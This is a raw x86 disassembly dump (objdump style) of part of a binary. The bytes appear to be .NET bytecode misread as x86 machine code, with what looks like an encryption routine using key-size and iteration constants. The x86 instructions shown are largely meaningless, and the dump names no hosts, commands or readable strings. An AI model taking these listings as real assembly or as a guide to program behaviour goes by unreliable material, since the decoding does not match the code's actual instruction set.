  403b96:	00 00                	add    %al,(%eax)
  403b98:	0a 6f b9             	or     -0x47(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 28                	or     (%eax),%ch
  403b9f:	1f                   	pop    %ds
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	0a 13                	or     (%ebx),%dl
  403ba4:	09 11                	or     %edx,(%ecx)
  403ba6:	09 2c 17             	or     %ebp,(%edi,%edx,1)
  403ba9:	00 11                	add    %dl,(%ecx)
  403bab:	08 28                	or     %ch,(%eax)
  403bad:	47                   	inc    %edi
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	06                   	push   %es
  403bb1:	00 7e 20             	add    %bh,0x20(%esi)
  403bb4:	00 00                	add    %al,(%eax)
  403bb6:	04 11                	add    $0x11,%al
  403bb8:	08 6f c1             	or     %ch,-0x3f(%edi)
  403bbb:	00 00                	add    %al,(%eax)
  403bbd:	0a 26                	or     (%esi),%ah
  403bbf:	00 00                	add    %al,(%eax)
  403bc1:	12 07                	adc    (%edi),%al
  403bc3:	28 c2                	sub    %al,%dl
  403bc5:	00 00                	add    %al,(%eax)
  403bc7:	0a 2d a9 de 0f 12    	or     0x120fdea9,%ch
  403bcd:	07                   	pop    %es
  403bce:	fe                   	(bad)
  403bcf:	16                   	push   %ss
  403bd0:	04 00                	add    $0x0,%al
  403bd2:	00 1b                	add    %bl,(%ebx)
  403bd4:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd5:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403bda:	dc 2b                	fsubrl (%ebx)
  403bdc:	00 00                	add    %al,(%eax)
  403bde:	de 13                	ficoms (%ebx)
  403be0:	13 0a                	adc    (%edx),%ecx
  403be2:	00 11                	add    %dl,(%ecx)
  403be4:	0a 6f 75             	or     0x75(%edi),%ch
  403be7:	00 00                	add    %al,(%eax)
  403be9:	0a 28                	or     (%eax),%ch
  403beb:	49                   	dec    %ecx
  403bec:	00 00                	add    %al,(%eax)
  403bee:	06                   	push   %es
  403bef:	00 00                	add    %al,(%eax)
  403bf1:	de 00                	fiadds (%eax)
  403bf3:	2a 41 4c             	sub    0x4c(%ecx),%al
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	00 00                	add    %al,(%eax)
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	ab                   	stos   %eax,%es:(%edi)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	00 86 00 00 00 31    	add    %al,0x31000000(%esi)
  403c05:	01 00                	add    %eax,(%eax)
  403c07:	00 13                	add    %dl,(%ebx)
  403c09:	00 00                	add    %al,(%eax)
  403c0b:	00 12                	add    %dl,(%edx)
  403c0d:	00 00                	add    %al,(%eax)
  403c0f:	01 02                	add    %eax,(%edx)
  403c11:	00 00                	add    %al,(%eax)
  403c13:	00 8d 01 00 00 5b    	add    %cl,0x5b000001(%ebp)
  403c19:	00 00                	add    %al,(%eax)
  403c1b:	00 e8                	add    %ch,%al
  403c1d:	01 00                	add    %eax,(%eax)
  403c1f:	00 0f                	add    %cl,(%edi)
	...
  403c29:	00 00                	add    %al,(%eax)
  403c2b:	00 01                	add    %al,(%ecx)
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	00 fb                	add    %bh,%bl
  403c31:	01 00                	add    %eax,(%eax)
  403c33:	00 fc                	add    %bh,%ah
  403c35:	01 00                	add    %eax,(%eax)
  403c37:	00 13                	add    %dl,(%ebx)
  403c39:	00 00                	add    %al,(%eax)
  403c3b:	00 12                	add    %dl,(%edx)
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	01 13                	add    %edx,(%ebx)
  403c41:	30 0b                	xor    %cl,(%ebx)
  403c43:	00 1a                	add    %bl,(%edx)
  403c45:	01 00                	add    %eax,(%eax)
  403c47:	00 17                	add    %dl,(%edi)
  403c49:	00 00                	add    %al,(%eax)
  403c4b:	11 00                	adc    %eax,(%eax)
  403c4d:	28 c3                	sub    %al,%bl
  403c4f:	00 00                	add    %al,(%eax)
  403c51:	0a 02                	or     (%edx),%al
  403c53:	72 1f                	jb     0x403c74
  403c55:	06                   	push   %es
  403c56:	00 70 6f             	add    %dh,0x6f(%eax)
  403c59:	4e                   	dec    %esi
  403c5a:	00 00                	add    %al,(%eax)
  403c5c:	0a 6f b9             	or     -0x47(%edi),%ch
  403c5f:	00 00                	add    %al,(%eax)
  403c61:	0a 28                	or     (%eax),%ch
  403c63:	42                   	inc    %edx
  403c64:	00 00                	add    %al,(%eax)
  403c66:	06                   	push   %es
  403c67:	28 c4                	sub    %al,%ah
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	0a 6f c5             	or     -0x3b(%edi),%ch
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 0a                	or     (%edx),%cl
  403c72:	06                   	push   %es
  403c73:	72 6f                	jb     0x403ce4
  403c75:	06                   	push   %es
  403c76:	00 70 6f             	add    %dh,0x6f(%eax)
  403c79:	c6 00 00             	movb   $0x0,(%eax)
  403c7c:	0a 0b                	or     (%ebx),%cl
  403c7e:	07                   	pop    %es
  403c7f:	28 c7                	sub    %al,%bh
  403c81:	00 00                	add    %al,(%eax)
  403c83:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  403c86:	2d 00 00 04 2c       	sub    $0x2c040000,%eax
  403c8b:	05 38 85 00 00       	add    $0x8538,%eax
  403c90:	00 20                	add    %ah,(%eax)
  403c92:	00 01                	add    %al,(%ecx)
  403c94:	00 00                	add    %al,(%eax)
  403c96:	72 8b                	jb     0x403c23
  403c98:	06                   	push   %es
  403c99:	00 70 14             	add    %dh,0x14(%eax)
  403c9c:	d0 0e                	rorb   $1,(%esi)
  403c9e:	00 00                	add    %al,(%eax)
  403ca0:	02 28                	add    (%eax),%ch
  403ca2:	c8 00 00 0a          	enter  $0x0,$0xa
  403ca6:	1f                   	pop    %ds
  403ca7:	09 8d 84 00 00 01    	or     %ecx,0x1000084(%ebp)
  403cad:	25 16 16 14 28       	and    $0x28141616,%eax
  403cb2:	c9                   	leave
  403cb3:	00 00                	add    %al,(%eax)
  403cb5:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  403cbb:	28 c9                	sub    %cl,%cl
  403cbd:	00 00                	add    %al,(%eax)
  403cbf:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  403cc5:	28 c9                	sub    %cl,%cl
  403cc7:	00 00                	add    %al,(%eax)
  403cc9:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  403ccf:	28 c9                	sub    %cl,%cl
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  403cd9:	28 c9                	sub    %cl,%cl
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  403ce3:	28 c9                	sub    %cl,%cl
  403ce5:	00 00                	add    %al,(%eax)
  403ce7:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  403ced:	28 c9                	sub    %cl,%cl
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  403cf7:	28 c9                	sub    %cl,%cl
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  403d01:	28 c9                	sub    %cl,%cl
  403d03:	00 00                	add    %al,(%eax)
  403d05:	0a a2 28 ca 00 00    	or     0xca28(%edx),%ah
  403d0b:	0a 28                	or     (%eax),%ch
  403d0d:	cb                   	lret
  403d0e:	00 00                	add    %al,(%eax)
  403d10:	0a 80 2d 00 00 04    	or     0x400002d(%eax),%al
  403d16:	7e 2d                	jle    0x403d45
  403d18:	00 00                	add    %al,(%eax)
  403d1a:	04 7b                	add    $0x7b,%al
  403d1c:	cc                   	int3
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	0a 7e 2d             	or     0x2d(%esi),%bh
  403d22:	00 00                	add    %al,(%eax)
  403d24:	04 08                	add    $0x8,%al
  403d26:	28 06                	sub    %al,(%esi)
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	06                   	push   %es
  403d2b:	7e 0b                	jle    0x403d38
  403d2d:	00 00                	add    %al,(%eax)
  403d2f:	04 7e                	add    $0x7e,%al
  403d31:	10 00                	adc    %al,(%eax)
  403d33:	00 04 02             	add    %al,(%edx,%eax,1)
  403d36:	72 93                	jb     0x403ccb
  403d38:	06                   	push   %es
  403d39:	00 70 6f             	add    %dh,0x6f(%eax)
  403d3c:	4e                   	dec    %esi
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	0a 6f bd             	or     -0x43(%edi),%ch
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 7e 1e             	or     0x1e(%esi),%bh
  403d47:	00 00                	add    %al,(%eax)
  403d49:	04 7e                	add    $0x7e,%al
  403d4b:	08 00                	or     %al,(%eax)
  403d4d:	00 04 7e             	add    %al,(%esi,%edi,2)
  403d50:	0f 00 00             	sldt   (%eax)
  403d53:	04 7e                	add    $0x7e,%al
  403d55:	04 00                	add    $0x0,%al
  403d57:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403d5a:	cd 00                	int    $0x0
  403d5c:	00 0a                	add    %cl,(%edx)
  403d5e:	00 28                	add    %ch,(%eax)
  403d60:	48                   	dec    %eax
  403d61:	00 00                	add    %al,(%eax)
  403d63:	06                   	push   %es
  403d64:	00 2a                	add    %ch,(%edx)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	13 30                	adc    (%eax),%esi
  403d6a:	02 00                	add    (%eax),%al
  403d6c:	35 00 00 00 07       	xor    $0x7000000,%eax
  403d71:	00 00                	add    %al,(%eax)
  403d73:	11 00                	adc    %eax,(%eax)
  403d75:	73 4d                	jae    0x403dc4
  403d77:	00 00                	add    %al,(%eax)
  403d79:	0a 0a                	or     (%edx),%cl
  403d7b:	06                   	push   %es
  403d7c:	72 79                	jb     0x403df7
  403d7e:	01 00                	add    %eax,(%eax)
  403d80:	70 6f                	jo     0x403df1
  403d82:	4e                   	dec    %esi
  403d83:	00 00                	add    %al,(%eax)
  403d85:	0a 72 a3             	or     -0x5d(%edx),%dh
  403d88:	06                   	push   %es
  403d89:	00 70 6f             	add    %dh,0x6f(%eax)
  403d8c:	4f                   	dec    %edi
  403d8d:	00 00                	add    %al,(%eax)
  403d8f:	0a 00                	or     (%eax),%al
  403d91:	06                   	push   %es
  403d92:	6f                   	outsl  %ds:(%esi),(%dx)
  403d93:	50                   	push   %eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	0a 28                	or     (%eax),%ch
  403d98:	20 00                	and    %al,(%eax)
  403d9a:	00 06                	add    %al,(%esi)
  403d9c:	00 20                	add    %ah,(%eax)
  403d9e:	e8 03 00 00 28       	call   0x28403da6
  403da3:	10 00                	adc    %al,(%eax)
  403da5:	00 0a                	add    %cl,(%edx)
  403da7:	00 2a                	add    %ch,(%edx)
  403da9:	00 00                	add    %al,(%eax)
  403dab:	00 13                	add    %dl,(%ebx)
  403dad:	30 02                	xor    %al,(%edx)
  403daf:	00 3c 00             	add    %bh,(%eax,%eax,1)
  403db2:	00 00                	add    %al,(%eax)
  403db4:	07                   	pop    %es
  403db5:	00 00                	add    %al,(%eax)
  403db7:	11 00                	adc    %eax,(%eax)
  403db9:	73 4d                	jae    0x403e08
  403dbb:	00 00                	add    %al,(%eax)
  403dbd:	0a 0a                	or     (%edx),%cl
  403dbf:	06                   	push   %es
  403dc0:	72 79                	jb     0x403e3b
  403dc2:	01 00                	add    %eax,(%eax)
  403dc4:	70 6f                	jo     0x403e35
  403dc6:	4e                   	dec    %esi
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	0a 72 b5             	or     -0x4b(%edx),%dh
  403dcc:	06                   	push   %es
  403dcd:	00 70 6f             	add    %dh,0x6f(%eax)
  403dd0:	4f                   	dec    %edi
  403dd1:	00 00                	add    %al,(%eax)
  403dd3:	0a 00                	or     (%eax),%al
  403dd5:	06                   	push   %es
  403dd6:	72 b5                	jb     0x403d8d
  403dd8:	06                   	push   %es
  403dd9:	00 70 6f             	add    %dh,0x6f(%eax)
  403ddc:	4e                   	dec    %esi
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	0a 02                	or     (%edx),%al
  403de1:	6f                   	outsl  %ds:(%esi),(%dx)
  403de2:	4f                   	dec    %edi
  403de3:	00 00                	add    %al,(%eax)
  403de5:	0a 00                	or     (%eax),%al
  403de7:	06                   	push   %es
  403de8:	6f                   	outsl  %ds:(%esi),(%dx)
  403de9:	50                   	push   %eax
  403dea:	00 00                	add    %al,(%eax)
  403dec:	0a 28                	or     (%eax),%ch
  403dee:	20 00                	and    %al,(%eax)
  403df0:	00 06                	add    %al,(%esi)
  403df2:	00 2a                	add    %ch,(%edx)
  403df4:	2e 73 ce             	jae,pn 0x403dc5
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  403dff:	2a 1b                	sub    (%ebx),%bl
  403e01:	30 03                	xor    %al,(%ebx)
  403e03:	00 5a 00             	add    %bl,0x0(%edx)
  403e06:	00 00                	add    %al,(%eax)
  403e08:	18 00                	sbb    %al,(%eax)
  403e0a:	00 11                	add    %dl,(%ecx)
  403e0c:	02 28                	add    (%eax),%ch
  403e0e:	14 00                	adc    $0x0,%al
  403e10:	00 0a                	add    %cl,(%edx)
  403e12:	00 00                	add    %al,(%eax)
  403e14:	03 28                	add    (%eax),%ebp
  403e16:	cf                   	iret
  403e17:	00 00                	add    %al,(%eax)
  403e19:	0a 0a                	or     (%edx),%cl
  403e1b:	06                   	push   %es
  403e1c:	2c 0b                	sub    $0xb,%al
  403e1e:	72 c1                	jb     0x403de1
  403e20:	06                   	push   %es
  403e21:	00 70 73             	add    %dh,0x73(%eax)
  403e24:	d0 00                	rolb   $1,(%eax)
  403e26:	00 0a                	add    %cl,(%edx)
  403e28:	7a 03                	jp     0x403e2d
  403e2a:	7e 27                	jle    0x403e53
  403e2c:	00 00                	add    %al,(%eax)
  403e2e:	04 20                	add    $0x20,%al
  403e30:	50                   	push   %eax
  403e31:	c3                   	ret
  403e32:	00 00                	add    %al,(%eax)
  403e34:	73 d1                	jae    0x403e07
  403e36:	00 00                	add    %al,(%eax)
  403e38:	0a 0b                	or     (%ebx),%cl
  403e3a:	00 02                	add    %al,(%edx)
  403e3c:	07                   	pop    %es
  403e3d:	1f                   	pop    %ds
  403e3e:	20 6f d2             	and    %ch,-0x2e(%edi)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	0a 7d 25             	or     0x25(%ebp),%bh
  403e46:	00 00                	add    %al,(%eax)
  403e48:	04 02                	add    $0x2,%al
  403e4a:	07                   	pop    %es
  403e4b:	1f                   	pop    %ds
  403e4c:	40                   	inc    %eax
  403e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e4e:	d2 00                	rolb   %cl,(%eax)
  403e50:	00 0a                	add    %cl,(%edx)
  403e52:	7d 26                	jge    0x403e7a
  403e54:	00 00                	add    %al,(%eax)
  403e56:	04 00                	add    $0x0,%al
  403e58:	de 0b                	fimuls (%ebx)
  403e5a:	07                   	pop    %es
  403e5b:	2c 07                	sub    $0x7,%al
  403e5d:	07                   	pop    %es
  403e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5f:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403e64:	dc 2a                	fsubrl (%edx)
  403e66:	00 00                	add    %al,(%eax)
  403e68:	01 10                	add    %edx,(%eax)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	02 00                	add    (%eax),%al
  403e6e:	2e 00 20             	add    %ah,%cs:(%eax)
  403e71:	4e                   	dec    %esi
  403e72:	00 0b                	add    %cl,(%ebx)
  403e74:	00 00                	add    %al,(%eax)
  403e76:	00 00                	add    %al,(%eax)
  403e78:	13 30                	adc    (%eax),%esi
  403e7a:	03 00                	add    (%eax),%eax
  403e7c:	1c 00                	sbb    $0x0,%al
  403e7e:	00 00                	add    %al,(%eax)
  403e80:	0d 00 00 11 00       	or     $0x110000,%eax
  403e85:	02 28                	add    (%eax),%ch
  403e87:	17                   	pop    %ss
  403e88:	00 00                	add    %al,(%eax)
  403e8a:	0a 03                	or     (%ebx),%al
  403e8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8d:	18 00                	sbb    %al,(%eax)
  403e8f:	00 0a                	add    %cl,(%edx)
  403e91:	28 4d 00             	sub    %cl,0x0(%ebp)
  403e94:	00 06                	add    %al,(%esi)
  403e96:	28 d3                	sub    %dl,%bl
  403e98:	00 00                	add    %al,(%eax)
  403e9a:	0a 0a                	or     (%edx),%cl
  403e9c:	2b 00                	sub    (%eax),%eax
  403e9e:	06                   	push   %es
  403e9f:	2a 1b                	sub    (%ebx),%bl
  403ea1:	30 05 00 25 01 00    	xor    %al,0x12500
  403ea7:	00 19                	add    %bl,(%ecx)
  403ea9:	00 00                	add    %al,(%eax)
  403eab:	11 00                	adc    %eax,(%eax)
  403ead:	03 14 fe             	add    (%esi,%edi,8),%edx
  403eb0:	01 0a                	add    %ecx,(%edx)
  403eb2:	06                   	push   %es
  403eb3:	2c 0b                	sub    $0xb,%al
  403eb5:	72 09                	jb     0x403ec0
  403eb7:	07                   	pop    %es
  403eb8:	00 70 73             	add    %dh,0x73(%eax)
  403ebb:	d4 00                	aam    $0x0
  403ebd:	00 0a                	add    %cl,(%edx)
  403ebf:	7a 73                	jp     0x403f34
  403ec1:	d5 00                	aad    $0x0
  403ec3:	00 0a                	add    %cl,(%edx)
  403ec5:	0b 00                	or     (%eax),%eax
  403ec7:	07                   	pop    %es
  403ec8:	1f                   	pop    %ds
  403ec9:	20 6a 6f             	and    %ch,0x6f(%edx)
  403ecc:	4a                   	dec    %edx
  403ecd:	00 00                	add    %al,(%eax)
  403ecf:	0a 00                	or     (%eax),%al
  403ed1:	73 d6                	jae    0x403ea9
  403ed3:	00 00                	add    %al,(%eax)
  403ed5:	0a 0c 00             	or     (%eax,%eax,1),%cl
  403ed8:	08 20                	or     %ah,(%eax)
  403eda:	00 01                	add    %al,(%ecx)
  403edc:	00 00                	add    %al,(%eax)
  403ede:	6f                   	outsl  %ds:(%esi),(%dx)
  403edf:	d7                   	xlat   %ds:(%ebx)
  403ee0:	00 00                	add    %al,(%eax)
  403ee2:	0a 00                	or     (%eax),%al
  403ee4:	08 20                	or     %ah,(%eax)
  403ee6:	80 00 00             	addb   $0x0,(%eax)
  403ee9:	00 6f d8             	add    %ch,-0x28(%edi)
  403eec:	00 00                	add    %al,(%eax)
  403eee:	0a 00                	or     (%eax),%al
  403ef0:	08 17                	or     %dl,(%edi)
  403ef2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef3:	d9 00                	flds   (%eax)
  403ef5:	00 0a                	add    %cl,(%edx)
  403ef7:	00 08                	add    %cl,(%eax)
  403ef9:	18 6f da             	sbb    %ch,-0x26(%edi)
  403efc:	00 00                	add    %al,(%eax)
  403efe:	0a 00                	or     (%eax),%al
  403f00:	08 02                	or     %al,(%edx)
  403f02:	7b 25                	jnp    0x403f29
  403f04:	00 00                	add    %al,(%eax)
  403f06:	04 6f                	add    $0x6f,%al
  403f08:	db 00                	fildl  (%eax)
  403f0a:	00 0a                	add    %cl,(%edx)
  403f0c:	00 08                	add    %cl,(%eax)
  403f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0f:	dc 00                	faddl  (%eax)
  403f11:	00 0a                	add    %cl,(%edx)
  403f13:	00 07                	add    %al,(%edi)
  403f15:	08 6f dd             	or     %ch,-0x23(%edi)
  403f18:	00 00                	add    %al,(%eax)
  403f1a:	0a 17                	or     (%edi),%dl
  403f1c:	73 de                	jae    0x403efc
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	0a 0d 00 07 08 6f    	or     0x6f080700,%cl
  403f26:	df 00                	filds  (%eax)
  403f28:	00 0a                	add    %cl,(%edx)
  403f2a:	16                   	push   %ss
  403f2b:	08 6f df             	or     %ch,-0x21(%edi)
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	0a 8e 69 6f 48 00    	or     0x486f69(%esi),%cl
  403f36:	00 0a                	add    %cl,(%edx)
  403f38:	00 09                	add    %cl,(%ecx)
  403f3a:	03 16                	add    (%esi),%edx
  403f3c:	03 8e 69 6f 48 00    	add    0x486f69(%esi),%ecx
  403f42:	00 0a                	add    %cl,(%edx)
  403f44:	00 09                	add    %cl,(%ecx)
  403f46:	6f                   	outsl  %ds:(%esi),(%dx)
  403f47:	e0 00                	loopne 0x403f49
  403f49:	00 0a                	add    %cl,(%edx)
  403f4b:	00 02                	add    %al,(%edx)
  403f4d:	7b 26                	jnp    0x403f75
  403f4f:	00 00                	add    %al,(%eax)
  403f51:	04 73                	add    $0x73,%al
  403f53:	e1 00                	loope  0x403f55
  403f55:	00 0a                	add    %cl,(%edx)
  403f57:	13 04 00             	adc    (%eax,%eax,1),%eax
  403f5a:	11 04 07             	adc    %eax,(%edi,%eax,1)
  403f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f5e:	e2 00                	loop   0x403f60
  403f60:	00 0a                	add    %cl,(%edx)
  403f62:	1f                   	pop    %ds
  403f63:	20 07                	and    %al,(%edi)
  403f65:	6f                   	outsl  %ds:(%esi),(%dx)
  403f66:	e2 00                	loop   0x403f68
  403f68:	00 0a                	add    %cl,(%edx)
  403f6a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  403f6d:	20 59 6f             	and    %bl,0x6f(%ecx)
  403f70:	e3 00                	jecxz  0x403f72
  403f72:	00 0a                	add    %cl,(%edx)
  403f74:	13 05 07 16 6a 6f    	adc    0x6f6a1607,%eax
  403f7a:	4a                   	dec    %edx
  403f7b:	00 00                	add    %al,(%eax)
  403f7d:	0a 00                	or     (%eax),%al
  403f7f:	07                   	pop    %es
  403f80:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  403f86:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  403f8d:	00 de                	add    %bl,%dh
  403f8f:	0d 11 04 2c 08       	or     $0x82c0411,%eax
  403f94:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403f97:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403f9c:	dc 00                	faddl  (%eax)
  403f9e:	de 0b                	fimuls (%ebx)
  403fa0:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  403fa3:	09 6f 2d             	or     %ebp,0x2d(%edi)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	0a 00                	or     (%eax),%al
  403faa:	dc 00                	faddl  (%eax)
  403fac:	de 0b                	fimuls (%ebx)
  403fae:	08 2c 07             	or     %ch,(%edi,%eax,1)
  403fb1:	08 6f 2d             	or     %ch,0x2d(%edi)
  403fb4:	00 00                	add    %al,(%eax)
  403fb6:	0a 00                	or     (%eax),%al
  403fb8:	dc 07                	faddl  (%edi)
  403fba:	6f                   	outsl  %ds:(%esi),(%dx)
  403fbb:	e2 00                	loop   0x403fbd
  403fbd:	00 0a                	add    %cl,(%edx)
  403fbf:	13 06                	adc    (%esi),%eax
  403fc1:	de 0b                	fimuls (%ebx)
  403fc3:	07                   	pop    %es
  403fc4:	2c 07                	sub    $0x7,%al
  403fc6:	07                   	pop    %es
  403fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc8:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403fcd:	dc 11                	fcoml  (%ecx)
  403fcf:	06                   	push   %es
  403fd0:	2a 00                	sub    (%eax),%al
  403fd2:	00 00                	add    %al,(%eax)
  403fd4:	01 34 00             	add    %esi,(%eax,%eax,1)
  403fd7:	00 02                	add    %al,(%edx)
  403fd9:	00 ad 00 37 e4 00    	add    %ch,0xe43700(%ebp)
  403fdf:	0d 00 00 00 00       	or     $0x0,%eax
  403fe4:	02 00                	add    (%eax),%al
  403fe6:	76 00                	jbe    0x403fe8
  403fe8:	7e f4                	jle    0x403fde
  403fea:	00 0b                	add    %cl,(%ebx)
  403fec:	00 00                	add    %al,(%eax)
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	02 00                	add    (%eax),%al
  403ff2:	2b 00                	sub    (%eax),%eax
  403ff4:	d7                   	xlat   %ds:(%ebx)
  403ff5:	02 01                	add    (%ecx),%al
  403ff7:	0b 00                	or     (%eax),%eax
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	00 02                	add    %al,(%edx)
  403ffd:	00 1a                	add    %bl,(%edx)
  403fff:	00 fd                	add    %bh,%ch
  404001:	17                   	pop    %ss
  404002:	01 0b                	add    %ecx,(%ebx)
  404004:	00 00                	add    %al,(%eax)
  404006:	00 00                	add    %al,(%eax)
  404008:	13 30                	adc    (%eax),%esi
  40400a:	03 00                	add    (%eax),%eax
  40400c:	1c 00                	sbb    $0x0,%al
  40400e:	00 00                	add    %al,(%eax)
  404010:	0d 00 00 11 00       	or     $0x110000,%eax
  404015:	28 17                	sub    %dl,(%edi)
  404017:	00 00                	add    %al,(%eax)
  404019:	0a 02                	or     (%edx),%al
  40401b:	03 28                	add    (%eax),%ebp
  40401d:	1a 00                	sbb    (%eax),%al
  40401f:	00 0a                	add    %cl,(%edx)
  404021:	28 4f 00             	sub    %cl,0x0(%edi)
  404024:	00 06                	add    %al,(%esi)
  404026:	6f                   	outsl  %ds:(%esi),(%dx)
  404027:	e4 00                	in     $0x0,%al
  404029:	00 0a                	add    %cl,(%edx)
  40402b:	0a 2b                	or     (%ebx),%ch
  40402d:	00 06                	add    %al,(%esi)
  40402f:	2a 1b                	sub    (%ebx),%bl
  404031:	30 05 00 58 01 00    	xor    %al,0x15800
  404037:	00 1a                	add    %bl,(%edx)
  404039:	00 00                	add    %al,(%eax)
  40403b:	11 00                	adc    %eax,(%eax)
  40403d:	03 14 fe             	add    (%esi,%edi,8),%edx
  404040:	01 0a                	add    %ecx,(%edx)
  404042:	06                   	push   %es
  404043:	2c 0b                	sub    $0xb,%al
  404045:	72 09                	jb     0x404050
  404047:	07                   	pop    %es
  404048:	00 70 73             	add    %dh,0x73(%eax)
  40404b:	d4 00                	aam    $0x0
  40404d:	00 0a                	add    %cl,(%edx)
  40404f:	7a 03                	jp     0x404054
  404051:	73 49                	jae    0x40409c
  404053:	00 00                	add    %al,(%eax)
  404055:	0a 0b                	or     (%ebx),%cl
  404057:	00 73 d6             	add    %dh,-0x2a(%ebx)
  40405a:	00 00                	add    %al,(%eax)
  40405c:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40405f:	08 20                	or     %ah,(%eax)
  404061:	00 01                	add    %al,(%ecx)
  404063:	00 00                	add    %al,(%eax)
  404065:	6f                   	outsl  %ds:(%esi),(%dx)
  404066:	d7                   	xlat   %ds:(%ebx)
  404067:	00 00                	add    %al,(%eax)
  404069:	0a 00                	or     (%eax),%al
  40406b:	08 20                	or     %ah,(%eax)
  40406d:	80 00 00             	addb   $0x0,(%eax)
  404070:	00 6f d8             	add    %ch,-0x28(%edi)
  404073:	00 00                	add    %al,(%eax)
  404075:	0a 00                	or     (%eax),%al
  404077:	08 17                	or     %dl,(%edi)
  404079:	6f                   	outsl  %ds:(%esi),(%dx)
  40407a:	d9 00                	flds   (%eax)
  40407c:	00 0a                	add    %cl,(%edx)
  40407e:	00 08                	add    %cl,(%eax)
  404080:	18 6f da             	sbb    %ch,-0x26(%edi)
  404083:	00 00                	add    %al,(%eax)
  404085:	0a 00                	or     (%eax),%al
  404087:	08 02                	or     %al,(%edx)
  404089:	7b 25                	jnp    0x4040b0
  40408b:	00 00                	add    %al,(%eax)
  40408d:	04 6f                	add    $0x6f,%al
  40408f:	db 00                	fildl  (%eax)
  404091:	00 0a                	add    %cl,(%edx)
  404093:	00 02                	add    %al,(%edx)
  404095:	7b 26                	jnp    0x4040bd
  404097:	00 00                	add    %al,(%eax)
  404099:	04 73                	add    $0x73,%al
  40409b:	e1 00                	loope  0x40409d
  40409d:	00 0a                	add    %cl,(%edx)
  40409f:	13 04 00             	adc    (%eax,%eax,1),%eax
  4040a2:	11 04 07             	adc    %eax,(%edi,%eax,1)
  4040a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a6:	e2 00                	loop   0x4040a8
  4040a8:	00 0a                	add    %cl,(%edx)
  4040aa:	1f                   	pop    %ds
  4040ab:	20 07                	and    %al,(%edi)
  4040ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ae:	e2 00                	loop   0x4040b0
  4040b0:	00 0a                	add    %cl,(%edx)
  4040b2:	8e 69 1f             	mov    0x1f(%ecx),%gs
  4040b5:	20 59 6f             	and    %bl,0x6f(%ecx)
  4040b8:	e3 00                	jecxz  0x4040ba
  4040ba:	00 0a                	add    %cl,(%edx)
  4040bc:	13 05 1f 20 8d 59    	adc    0x598d201f,%eax
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	01 13                	add    %edx,(%ebx)
  4040c6:	06                   	push   %es
  4040c7:	07                   	pop    %es
  4040c8:	11 06                	adc    %eax,(%esi)
  4040ca:	16                   	push   %ss
  4040cb:	11 06                	adc    %eax,(%esi)
  4040cd:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4040d0:	41                   	inc    %ecx
  4040d1:	00 00                	add    %al,(%eax)
  4040d3:	0a 26                	or     (%esi),%ah
  4040d5:	02 11                	add    (%ecx),%dl
  4040d7:	05 11 06 28 50       	add    $0x50280611,%eax
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	06                   	push   %es
  4040df:	16                   	push   %ss
  4040e0:	fe 01                	incb   (%ecx)
  4040e2:	13 07                	adc    (%edi),%eax
  4040e4:	11 07                	adc    %eax,(%edi)
  4040e6:	2c 0b                	sub    $0xb,%al
  4040e8:	72 37                	jb     0x404121
